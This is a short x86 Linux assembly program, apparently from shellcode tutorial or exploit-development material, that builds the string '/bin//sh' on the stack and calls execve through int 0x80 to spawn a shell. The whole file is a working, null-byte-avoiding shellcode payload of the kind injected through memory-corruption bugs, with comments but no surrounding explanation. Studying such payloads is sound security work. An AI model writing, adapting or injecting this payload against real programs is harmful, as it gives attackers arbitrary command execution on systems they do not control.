section .text
	global _start

_start:
	xor eax, eax	; eax = 0
	push eax		; 0x0
	push 0x68732f2f	; //sh
	push 0x6e69622f	; /bin
	mov ebx, esp	; ebx = "/bin//sh "
	mov ecx, eax	; ecx = eax = 0
	mov al, 0xb		; al = execve() ; mov eax, 0x0000000b
	int 0x80